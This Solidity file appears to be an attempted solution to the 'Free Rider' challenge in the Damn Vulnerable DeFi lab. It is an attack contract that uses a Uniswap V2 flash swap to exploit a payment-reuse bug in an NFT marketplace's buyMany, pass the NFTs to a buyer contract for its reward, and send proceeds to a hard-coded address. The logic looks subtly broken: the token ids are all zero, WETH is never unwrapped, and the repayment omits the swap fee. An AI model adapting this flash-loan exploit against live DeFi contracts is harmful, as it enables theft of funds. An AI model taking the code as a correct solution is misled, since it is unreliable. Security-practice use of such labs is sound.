// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "./FreeRiderNFTMarketplace.sol";
import "./FreeRiderBuyer.sol";
import "../DamnValuableNFT.sol";

interface IUniswapV2Pair {
  function uniswapV2Call(address sender, uint amount0, uint amount1, bytes calldata data) external;
  function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
}

contract FreeRiderBuyerAttack {
    
    FreeRiderBuyer public immutable freeRiderBuyer;
    DamnValuableNFT public immutable damnValuableNFT;
    IUniswapV2Pair public immutable iUniswapV2Pair;
    FreeRiderNFTMarketplace freeRiderNFTMarketplace;
    
    address public owner;

    constructor(address freeRiderBuyerAddress,FreeRiderNFTMarketplace freeRiderNFTMarketplaceAddress,address iUniswapV2PairAddress,address damnValuableNFTAddress) {
        freeRiderBuyer = FreeRiderBuyer(freeRiderBuyerAddress);
        damnValuableNFT=DamnValuableNFT(damnValuableNFTAddress);
        iUniswapV2Pair=IUniswapV2Pair(iUniswapV2PairAddress);
        freeRiderNFTMarketplace = FreeRiderNFTMarketplace(freeRiderNFTMarketplaceAddress);
        
        owner=msg.sender;
    }

    function flashLoan(uint256 amount) external {
        require(msg.sender==owner,"only owner can call");
        //bytes memory data = abi.encode(iUniswapV2Pair.token0(), 15);

        iUniswapV2Pair.swap(15 ether, 0, address(this), "0x");
        
        payable(address(0x70997970C51812dc3A010C7d01b50e0d17dc79C8)).send(address(this).balance);
    }

    function uniswapV2Call(address sender, uint amount0, uint amount1, bytes calldata data) external{
        uint256[] memory NFTamount=new uint256[](6);
        freeRiderNFTMarketplace.buyMany{value: 15 ether}(NFTamount);
       
        for(uint256 i;i<6;i++){
            damnValuableNFT.approve(address(damnValuableNFT),i);
            damnValuableNFT.transferFrom(address(this),address(freeRiderBuyer),i); 
        }
        payable(address(iUniswapV2Pair)).transfer(15 ether);
    }
}